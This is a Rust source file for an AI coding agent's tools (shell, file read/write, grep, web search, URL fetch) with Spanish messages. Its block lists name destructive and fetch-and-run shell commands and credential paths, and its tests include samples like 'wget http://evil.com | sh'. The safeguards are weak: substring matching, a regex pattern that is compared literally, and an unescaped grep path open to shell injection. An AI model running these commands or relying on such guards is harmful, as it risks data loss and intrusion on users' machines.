use serde::{Deserialize, Serialize};
use std::path::Path;
use std::sync::Mutex;
use std::sync::OnceLock;

#[derive(Serialize, Deserialize, Clone)]
pub struct ToolDefinition {
    pub name: String,
    pub description: String,
    pub parameters: Vec<ToolParam>,
}

#[derive(Serialize, Deserialize, Clone)]
pub struct ToolParam {
    pub name: String,
    pub param_type: String,
    pub description: String,
    pub required: bool,
}

#[derive(Serialize, Deserialize, Clone)]
pub struct ToolResult {
    pub success: bool,
    pub output: String,
    pub error: Option<String>,
    pub requires_confirmation: bool,
    pub preview: Option<String>,
}

const BLOCKED_SHELL_PATTERNS: &[&str] = &[
    "rm -rf /",
    "rm -rf /*",
    "rm -rf ~",
    "rm -rf $home",
    "mkfs.",
    "dd if=",
    ":(){",
    "fork",
    "> /dev/",
    "> /dev/sd",
    "chmod 777",
    "chmod -R 777",
    "chown ",
    "sudo ",
    "su ",
    "passwd ",
    "| sh",
    "| bash",
    "| zsh",
    "wget.*|",
    "curl.*|",
];

const BLOCKED_PATHS: &[&str] = &[
    "/etc/shadow",
    "/etc/gshadow",
    "/etc/sudoers",
    "/etc/ssh/",
    "~/.ssh/",
    "/.ssh/",
    "/root/",
    "/boot/",
    "/dev/",
    "/proc/",
    "/sys/",
];

struct RateLimiter {
    count: u32,
    window_start: std::time::Instant,
    limit: u32,
}

impl RateLimiter {
    fn new(limit: u32) -> Self {
        Self {
            count: 0,
            window_start: std::time::Instant::now(),
            limit,
        }
    }

    fn check(&mut self, limit: u32) -> Result<(), String> {
        self.limit = limit;
        if self.window_start.elapsed().as_secs() >= 60 {
            self.count = 0;
            self.window_start = std::time::Instant::now();
        }
        if self.count >= self.limit {
            return Err(format!(
                "Límite de herramientas alcanzado ({} por minuto). Espera un momento o aumenta el límite en Settings.",
                self.limit
            ));
        }
        self.count += 1;
        Ok(())
    }
}

fn get_rate_limiter() -> &'static Mutex<RateLimiter> {
    static LIMITER: OnceLock<Mutex<RateLimiter>> = OnceLock::new();
    LIMITER.get_or_init(|| Mutex::new(RateLimiter::new(30)))
}

pub fn get_all_tools() -> Vec<ToolDefinition> {
    vec![
        ToolDefinition {
            name: "shell".into(),
            description: "Ejecuta un comando en la terminal del sistema. Útil para comandos del sistema, git, npm, etc.".into(),
            parameters: vec![ToolParam {
                name: "command".into(),
                param_type: "string".into(),
                description: "El comando completo a ejecutar".into(),
                required: true,
            }],
        },
        ToolDefinition {
            name: "read_file".into(),
            description: "Lee el contenido de un archivo en el sistema de archivos".into(),
            parameters: vec![ToolParam {
                name: "path".into(),
                param_type: "string".into(),
                description: "Ruta absoluta al archivo".into(),
                required: true,
            }],
        },
        ToolDefinition {
            name: "write_file".into(),
            description: "Escribe o sobrescribe contenido en un archivo. Crea directorios intermedios si no existen.".into(),
            parameters: vec![
                ToolParam {
                    name: "path".into(),
                    param_type: "string".into(),
                    description: "Ruta absoluta al archivo".into(),
                    required: true,
                },
                ToolParam {
                    name: "content".into(),
                    param_type: "string".into(),
                    description: "Contenido a escribir".into(),
                    required: true,
                },
            ],
        },
        ToolDefinition {
            name: "glob".into(),
            description: "Busca archivos por patrón glob (ej: **/*.ts, src/**/*.rs)".into(),
            parameters: vec![ToolParam {
                name: "pattern".into(),
                param_type: "string".into(),
                description: "Patrón glob para buscar archivos".into(),
                required: true,
            }],
        },
        ToolDefinition {
            name: "grep".into(),
            description: "Busca texto dentro de archivos usando una expresión regular".into(),
            parameters: vec![
                ToolParam {
                    name: "pattern".into(),
                    param_type: "string".into(),
                    description: "Expresión regular a buscar".into(),
                    required: true,
                },
                ToolParam {
                    name: "path".into(),
                    param_type: "string".into(),
                    description: "Ruta del directorio donde buscar (opcional, default: directorio actual)".into(),
                    required: false,
                },
            ],
        },
        ToolDefinition {
            name: "web_search".into(),
            description: "Busca información en internet usando Tavily. Devuelve resultados relevantes con resumen. Necesita API key de Tavily configurada en Settings.".into(),
            parameters: vec![ToolParam {
                name: "query".into(),
                param_type: "string".into(),
                description: "Términos de búsqueda".into(),
                required: true,
            }],
        },
        ToolDefinition {
            name: "fetch_url".into(),
            description: "Obtiene el contenido de una URL y lo devuelve como texto. Útil para leer documentación, APIs, o páginas web.".into(),
            parameters: vec![ToolParam {
                name: "url".into(),
                param_type: "string".into(),
                description: "URL completa a fetch (incluyendo https://)".into(),
                required: true,
            }],
        },
    ]
}

fn check_dangerous_shell(command: &str) -> Option<&'static str> {
    let lower = command.to_lowercase();
    for &pattern in BLOCKED_SHELL_PATTERNS {
        if lower.contains(pattern) {
            return Some(pattern);
        }
    }
    None
}

fn check_command_allowlist(command: &str, allowlist: &str) -> Option<String> {
    if allowlist.is_empty() {
        return None;
    }
    let base = command.trim().split_whitespace().next().unwrap_or("");
    if base.is_empty() {
        return Some("Comando vacío".into());
    }
    let allowed: Vec<&str> = allowlist.split(',').map(|s| s.trim()).filter(|s| !s.is_empty()).collect();
    if allowed.is_empty() {
        return None;
    }
    let base_name = std::path::Path::new(base)
        .file_name()
        .and_then(|f| f.to_str())
        .unwrap_or(base);
    if !allowed.contains(&base_name) {
        return Some(format!(
            "'{}' no está en la lista de comandos permitidos. Permitidos: {}",
            base_name,
            allowed.join(", ")
        ));
    }
    None
}

fn check_dangerous_path(path: &str) -> Option<String> {
    let normalized = path.replace("~", "$HOME");
    if let Some(wd) = &std::env::var("HOME").ok() {
        for blocked in BLOCKED_PATHS {
            let expanded = blocked.replace("~", wd);
            if normalized.starts_with(&expanded) || normalized == expanded.trim_end_matches('/') {
                return Some(format!("Ruta sensible del sistema: {}", blocked));
            }
        }
    }
    None
}

fn check_path_scope(path: &str, working_dir: &Option<String>, restrict: bool) -> Option<String> {
    if let Some(wd) = working_dir {
        if !wd.is_empty() && !path.starts_with(wd) {
            if !path.starts_with("/tmp/") && !path.starts_with("/home/") {
                let msg = format!("Fuera del directorio de trabajo: {}", wd);
                return Some(msg);
            }
        }
    } else if restrict {
        return Some("No hay directorio de trabajo configurado. Configúralo en Settings > Agente.".into());
    }
    None
}

fn check_rate_limit(rate_limit: u32) -> Result<(), String> {
    match get_rate_limiter().lock() {
        Ok(mut limiter) => limiter.check(rate_limit),
        Err(_) => Ok(()),
    }
}

pub async fn execute_tool(
    name: &str,
    args: &str,
    working_dir: Option<String>,
    confirmed: bool,
    restrict_to_workdir: bool,
    rate_limit: u32,
    use_allowlist: bool,
    command_allowlist: String,
    auto_confirm: bool,
) -> ToolResult {
    if let Err(msg) = check_rate_limit(rate_limit) {
        return ToolResult {
            success: false,
            output: String::new(),
            error: Some(msg),
            requires_confirmation: false,
            preview: None,
        };
    }

    let effective_confirmed = confirmed || auto_confirm;

    match name {
        "shell" => shell_execute(args, effective_confirmed, use_allowlist, &command_allowlist).await,
        "read_file" => read_file_execute(args, &working_dir, effective_confirmed, restrict_to_workdir).await,
        "write_file" => write_file_execute(args, &working_dir, effective_confirmed, restrict_to_workdir).await,
        "glob" => glob_execute(args).await,
        "grep" => grep_execute(args).await,
        "web_search" => web_search_execute(args).await,
        "fetch_url" => fetch_url_execute(args).await,
        _ => {
            // Try plugin
            let plugin_result = crate::plugins::execute_plugin(name, args);
            if plugin_result.success || plugin_result.error.as_deref() != Some(&format!("Plugin '{}' no encontrado", name)) {
                ToolResult {
                    success: plugin_result.success,
                    output: plugin_result.output,
                    error: plugin_result.error,
                    requires_confirmation: false,
                    preview: None,
                }
            } else {
                ToolResult {
                    success: false,
                    output: String::new(),
                    error: Some(format!("Herramienta '{}' no encontrada", name)),
                    requires_confirmation: false,
                    preview: None,
                }
            }
        },
    }
}

async fn shell_execute(args: &str, confirmed: bool, use_allowlist: bool, command_allowlist: &str) -> ToolResult {
    let parsed: Result<serde_json::Value, _> = serde_json::from_str(args);
    let command = match parsed {
        Ok(ref v) => v["command"].as_str().unwrap_or(args),
        Err(_) => args,
    };

    let warning = check_dangerous_shell(command)
        .map(|p| format!("Comando potencialmente peligroso: coincide con patrón '{}'", p));

    if warning.is_some() && !confirmed {
        return ToolResult {
            success: false,
            output: String::new(),
            error: None,
            requires_confirmation: true,
            preview: warning,
        };
    }

    // Allowlist check
    if use_allowlist {
        if let Some(msg) = check_command_allowlist(command, command_allowlist) {
            return ToolResult {
                success: false,
                output: String::new(),
                error: Some(msg),
                requires_confirmation: false,
                preview: None,
            };
        }
    }

    let output = tokio::process::Command::new("sh")
        .arg("-c")
        .arg(command)
        .output()
        .await;

    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout).to_string();
            let stderr = String::from_utf8_lossy(&out.stderr).to_string();

            ToolResult {
                success: true,
                output: if stdout.is_empty() { stderr.clone() } else { stdout },
                error: if out.status.success() { None } else { Some(stderr) },
                requires_confirmation: false,
                preview: None,
            }
        }
        Err(e) => ToolResult {
            success: false,
            output: String::new(),
            error: Some(format!("Error al ejecutar comando: {}", e)),
            requires_confirmation: false,
            preview: None,
        },
    }
}

async fn read_file_execute(args: &str, working_dir: &Option<String>, confirmed: bool, restrict: bool) -> ToolResult {
    let parsed: Result<serde_json::Value, _> = serde_json::from_str(args);
    let path = match parsed {
        Ok(ref v) => v["path"].as_str().unwrap_or(args),
        Err(_) => args,
    };

    let warning = check_dangerous_path(path)
        .or_else(|| check_path_scope(path, working_dir, restrict));

    if warning.is_some() && !confirmed {
        let is_blocked = restrict && warning.as_ref().is_some_and(|w| w.starts_with("Fuera del"));
        let err = if is_blocked { warning.clone() } else { None };
        return ToolResult {
            success: false,
            output: String::new(),
            error: err,
            requires_confirmation: !is_blocked,
            preview: if is_blocked { None } else { warning },
        };
    }

    match tokio::fs::read_to_string(path).await {
        Ok(content) => ToolResult {
            success: true,
            output: content,
            error: None,
            requires_confirmation: false,
            preview: None,
        },
        Err(e) => ToolResult {
            success: false,
            output: String::new(),
            error: Some(format!("Error al leer archivo '{}': {}", path, e)),
            requires_confirmation: false,
            preview: None,
        },
    }
}

async fn write_file_execute(args: &str, working_dir: &Option<String>, confirmed: bool, restrict: bool) -> ToolResult {
    let parsed: Result<serde_json::Value, _> = serde_json::from_str(args);
    let (path, content) = match parsed {
        Ok(ref v) => (
            v["path"].as_str().unwrap_or(""),
            v["content"].as_str().unwrap_or(""),
        ),
        Err(_) => return ToolResult {
            success: false,
            output: String::new(),
            error: Some("Formato inválido. Usa JSON con 'path' y 'content'".into()),
            requires_confirmation: false,
            preview: None,
        },
    };

    if path.is_empty() {
        return ToolResult {
            success: false,
            output: String::new(),
            error: Some("'path' es requerido".into()),
            requires_confirmation: false,
            preview: None,
        };
    }

    let warning = check_dangerous_path(path)
        .or_else(|| check_path_scope(path, working_dir, restrict));

    if warning.is_some() && !confirmed {
        let is_blocked = restrict && warning.as_ref().is_some_and(|w| w.starts_with("Fuera del"));
        let err = if is_blocked { warning.clone() } else { None };
        return ToolResult {
            success: false,
            output: String::new(),
            error: err,
            requires_confirmation: !is_blocked,
            preview: if is_blocked { None } else { warning },
        };
    }

    if let Some(parent) = Path::new(path).parent() {
        if !parent.as_os_str().is_empty() {
            let _ = tokio::fs::create_dir_all(parent).await;
        }
    }

    match tokio::fs::write(path, content).await {
        Ok(_) => ToolResult {
            success: true,
            output: format!("Archivo '{}' escrito correctamente ({} bytes)", path, content.len()),
            error: None,
            requires_confirmation: false,
            preview: None,
        },
        Err(e) => ToolResult {
            success: false,
            output: String::new(),
            error: Some(format!("Error al escribir archivo '{}': {}", path, e)),
            requires_confirmation: false,
            preview: None,
        },
    }
}

async fn glob_execute(args: &str) -> ToolResult {
    let parsed: Result<serde_json::Value, _> = serde_json::from_str(args);
    let pattern = match parsed {
        Ok(ref v) => v["pattern"].as_str().unwrap_or(args),
        Err(_) => args,
    };

    let output = tokio::process::Command::new("sh")
        .arg("-c")
        .arg(format!("find . -path '{}' 2>/dev/null | head -200", pattern.replace('\'', "'\\''")))
        .output()
        .await;

    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout).to_string();
            let files: Vec<&str> = stdout.lines().collect();

            if files.is_empty() {
                ToolResult {
                    success: true,
                    output: "No se encontraron archivos con ese patrón.".into(),
                    error: None,
                    requires_confirmation: false,
                    preview: None,
                }
            } else {
                ToolResult {
                    success: true,
                    output: format!("{} archivos encontrados:\n{}", files.len(), stdout),
                    error: None,
                    requires_confirmation: false,
                    preview: None,
                }
            }
        }
        Err(e) => ToolResult {
            success: false,
            output: String::new(),
            error: Some(format!("Error en búsqueda glob: {}", e)),
            requires_confirmation: false,
            preview: None,
        },
    }
}

async fn grep_execute(args: &str) -> ToolResult {
    let parsed: Result<serde_json::Value, _> = serde_json::from_str(args);
    let (pattern, path) = match parsed {
        Ok(ref v) => (
            v["pattern"].as_str().unwrap_or(""),
            v["path"].as_str().unwrap_or("."),
        ),
        Err(_) => return ToolResult {
            success: false,
            output: String::new(),
            error: Some("Formato inválido. Usa JSON con 'pattern' y opcional 'path'".into()),
            requires_confirmation: false,
            preview: None,
        },
    };

    if pattern.is_empty() {
        return ToolResult {
            success: false,
            output: String::new(),
            error: Some("'pattern' es requerido".into()),
            requires_confirmation: false,
            preview: None,
        };
    }

    let output = tokio::process::Command::new("sh")
        .arg("-c")
        .arg(format!("rg -n '{}' '{}' 2>/dev/null | head -200", pattern.replace('\'', "'\\''"), path))
        .output()
        .await;

    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout).to_string();
            if stdout.is_empty() {
                let fallback = tokio::process::Command::new("sh")
                    .arg("-c")
                    .arg(format!("grep -rn '{}' '{}' 2>/dev/null | head -200", pattern.replace('\'', "'\\''"), path))
                    .output()
                    .await;
                match fallback {
                    Ok(fb) => {
                        let fb_out = String::from_utf8_lossy(&fb.stdout).to_string();
                        if fb_out.is_empty() {
                            ToolResult {
                                success: true,
                                output: "No se encontraron coincidencias.".into(),
                                error: None,
                                requires_confirmation: false,
                                preview: None,
                            }
                        } else {
                            ToolResult {
                                success: true,
                                output: format!("{} coincidencias:\n{}", fb_out.lines().count(), fb_out),
                                error: None,
                                requires_confirmation: false,
                                preview: None,
                            }
                        }
                    }
                    Err(_) => ToolResult {
                        success: true,
                        output: "No se encontraron coincidencias.".into(),
                        error: None,
                        requires_confirmation: false,
                        preview: None,
                    }
                }
            } else {
                ToolResult {
                    success: true,
                    output: format!("{} coincidencias:\n{}", stdout.lines().count(), stdout),
                    error: None,
                    requires_confirmation: false,
                    preview: None,
                }
            }
        }
        Err(e) => ToolResult {
            success: false,
            output: String::new(),
            error: Some(format!("Error en búsqueda grep: {}", e)),
            requires_confirmation: false,
            preview: None,
        },
    }
}

async fn web_search_execute(args: &str) -> ToolResult {
    let parsed: Result<serde_json::Value, _> = serde_json::from_str(args);
    let query = match parsed {
        Ok(ref v) => v["query"].as_str().unwrap_or(""),
        Err(_) => args,
    };

    if query.is_empty() {
        return ToolResult {
            success: false,
            output: String::new(),
            error: Some("'query' es requerido para web_search".into()),
            requires_confirmation: false,
            preview: None,
        };
    }

    // Read Tavily API key from keyring
    let api_key = match crate::keyring::get_key("tavily") {
        Ok(k) => k,
        Err(_) => {
            return ToolResult {
                success: false,
                output: String::new(),
                error: Some("API key de Tavily no configurada. Configúrala en Settings > Búsqueda.".into()),
                requires_confirmation: false,
                preview: None,
            };
        }
    };

    let result = crate::search::search_tavily(api_key, query.to_string()).await;

    if !result.success {
        return ToolResult {
            success: false,
            output: String::new(),
            error: Some(result.error.unwrap_or_else(|| "Error en búsqueda web".into())),
            requires_confirmation: false,
            preview: None,
        };
    }

    let mut output = String::new();

    if let Some(answer) = result.answer {
        output.push_str(&format!("Resumen: {}\n\n", answer));
    }

    if result.results.is_empty() {
        output.push_str("No se encontraron resultados.");
    } else {
        for (i, r) in result.results.iter().enumerate() {
            output.push_str(&format!("{}. {}\n   URL: {}\n   {}\n\n", i + 1, r.title, r.url, r.content));
        }
    }

    ToolResult {
        success: true,
        output,
        error: None,
        requires_confirmation: false,
        preview: None,
    }
}

async fn fetch_url_execute(args: &str) -> ToolResult {
    let parsed: Result<serde_json::Value, _> = serde_json::from_str(args);
    let url = match parsed {
        Ok(ref v) => v["url"].as_str().unwrap_or(""),
        Err(_) => args,
    };

    if url.is_empty() {
        return ToolResult {
            success: false,
            output: String::new(),
            error: Some("'url' es requerido para fetch_url".into()),
            requires_confirmation: false,
            preview: None,
        };
    }

    if !url.starts_with("http://") && !url.starts_with("https://") {
        return ToolResult {
            success: false,
            output: String::new(),
            error: Some("URL debe empezar con http:// o https://".into()),
            requires_confirmation: false,
            preview: None,
        };
    }

    let client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(30))
        .user_agent("Solaria-Agent/1.0")
        .build()
        .unwrap_or_default();

    match client.get(url).send().await {
        Ok(resp) => {
            if !resp.status().is_success() {
                return ToolResult {
                    success: false,
                    output: String::new(),
                    error: Some(format!("HTTP {}", resp.status().as_u16())),
                    requires_confirmation: false,
                    preview: None,
                };
            }

            let content_type = resp.headers()
                .get("content-type")
                .and_then(|v| v.to_str().ok())
                .unwrap_or("")
                .to_string();

            if content_type.contains("application/pdf") || content_type.contains("image/") || content_type.contains("audio/") || content_type.contains("video/") {
                return ToolResult {
                    success: false,
                    output: String::new(),
                    error: Some(format!("Tipo de contenido no soportado: {}", content_type)),
                    requires_confirmation: false,
                    preview: None,
                };
            }

            match resp.text().await {
                Ok(text) => {
                    let max_len = 15000;
                    let truncated = if text.len() > max_len {
                        format!("{}...\n[Contenido truncado a {} caracteres]", &text[..max_len], max_len)
                    } else {
                        text
                    };
                    ToolResult {
                        success: true,
                        output: format!("URL: {}\n\n{}", url, truncated),
                        error: None,
                        requires_confirmation: false,
                        preview: None,
                    }
                }
                Err(e) => ToolResult {
                    success: false,
                    output: String::new(),
                    error: Some(format!("Error al leer cuerpo: {}", e)),
                    requires_confirmation: false,
                    preview: None,
                },
            }
        }
        Err(e) => ToolResult {
            success: false,
            output: String::new(),
            error: Some(format!("Error de conexión: {}", e)),
            requires_confirmation: false,
            preview: None,
        },
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_check_dangerous_shell() {
        assert!(check_dangerous_shell("rm -rf /").is_some());
        assert!(check_dangerous_shell("rm -rf /*").is_some());
        assert!(check_dangerous_shell("rm -rf $home").is_some());
        assert!(check_dangerous_shell("rm -rf $HOME").is_some());
        assert!(check_dangerous_shell("sudo rm -rf /").is_some());
        assert!(check_dangerous_shell("mkfs.ext4 /dev/sda1").is_some());
        assert!(check_dangerous_shell("dd if=/dev/zero of=/dev/sda").is_some());
        assert!(check_dangerous_shell("chmod 777 /etc/shadow").is_some());
        assert!(check_dangerous_shell("wget http://evil.com | sh").is_some());

        assert!(check_dangerous_shell("ls -la").is_none());
        assert!(check_dangerous_shell("cat file.txt").is_none());
        assert!(check_dangerous_shell("echo hello").is_none());
        assert!(check_dangerous_shell("git status").is_none());
        assert!(check_dangerous_shell("npm install").is_none());
    }

    #[test]
    fn test_check_command_allowlist() {
        assert_eq!(check_command_allowlist("ls -la", "ls,cat,echo"), None);
        assert_eq!(check_command_allowlist("cat file.txt", "ls,cat,echo"), None);
        assert_eq!(check_command_allowlist("echo hello", "ls,cat,echo"), None);

        assert!(check_command_allowlist("rm -rf /", "ls,cat,echo").is_some());
        assert!(check_command_allowlist("sudo ls", "ls,cat,echo").is_some());
        assert!(check_command_allowlist("", "ls,cat,echo").is_some());

        assert_eq!(check_command_allowlist("ls", ""), None);
    }

    #[test]
    fn test_parse_tool_call_json() {
        let json: serde_json::Value = serde_json::from_str(
            r#"{"name": "shell", "arguments": {"command": "ls -la"}}"#
        ).unwrap();
        assert_eq!(json["name"], "shell");
        assert_eq!(json["arguments"]["command"], "ls -la");
    }

    #[test]
    fn test_parse_read_file_tool() {
        let json: serde_json::Value = serde_json::from_str(
            r#"{"name": "read_file", "arguments": {"path": "/home/user/file.txt"}}"#
        ).unwrap();
        assert_eq!(json["name"], "read_file");
        assert_eq!(json["arguments"]["path"], "/home/user/file.txt");
    }

    #[test]
    fn test_parse_write_file_tool() {
        let json: serde_json::Value = serde_json::from_str(
            r#"{"name": "write_file", "arguments": {"path": "/tmp/test.txt", "content": "hello"}}"#
        ).unwrap();
        assert_eq!(json["name"], "write_file");
        assert_eq!(json["arguments"]["path"], "/tmp/test.txt");
    }
}

pub async fn execute_tool_sandboxed(
    name: &str,
    args: &str,
    container_id: &str,
) -> ToolResult {
    match name {
        "shell" => {
            let parsed: Result<serde_json::Value, _> = serde_json::from_str(args);
            let command = match parsed {
                Ok(ref v) => v["command"].as_str().unwrap_or(args),
                Err(_) => args,
            };
            let result = crate::sandbox::exec_command(container_id, command);
            ToolResult {
                success: result.success,
                output: result.output,
                error: result.error,
                requires_confirmation: false,
                preview: None,
            }
        }
        "read_file" => {
            let parsed: Result<serde_json::Value, _> = serde_json::from_str(args);
            let path = match parsed {
                Ok(ref v) => v["path"].as_str().unwrap_or(args),
                Err(_) => args,
            };
            let result = crate::sandbox::read_file(container_id, path);
            ToolResult {
                success: result.success,
                output: result.output,
                error: result.error,
                requires_confirmation: false,
                preview: None,
            }
        }
        "write_file" => {
            let parsed: Result<serde_json::Value, _> = serde_json::from_str(args);
            let (path, content) = match parsed {
                Ok(ref v) => (
                    v["path"].as_str().unwrap_or(""),
                    v["content"].as_str().unwrap_or(""),
                ),
                Err(_) => return ToolResult {
                    success: false,
                    output: String::new(),
                    error: Some("Formato inválido".into()),
                    requires_confirmation: false,
                    preview: None,
                },
            };
            let result = crate::sandbox::write_file(container_id, path, content);
            ToolResult {
                success: result.success,
                output: result.output,
                error: result.error,
                requires_confirmation: false,
                preview: None,
            }
        }
        "glob" => {
            // Fallback to local glob since sandbox doesn't support it easily
            glob_execute(args).await
        }
        "grep" => {
            grep_execute(args).await
        }
        "web_search" => web_search_execute(args).await,
        "fetch_url" => fetch_url_execute(args).await,
        _ => {
            let plugin_result = crate::plugins::execute_plugin(name, args);
            if plugin_result.success || plugin_result.error.as_deref() != Some(&format!("Plugin '{}' no encontrado", name)) {
                ToolResult {
                    success: plugin_result.success,
                    output: plugin_result.output,
                    error: plugin_result.error,
                    requires_confirmation: false,
                    preview: None,
                }
            } else {
                ToolResult {
                    success: false,
                    output: String::new(),
                    error: Some(format!("Herramienta '{}' no soportada en sandbox", name)),
                    requires_confirmation: false,
                    preview: None,
                }
            }
        },
    }
}
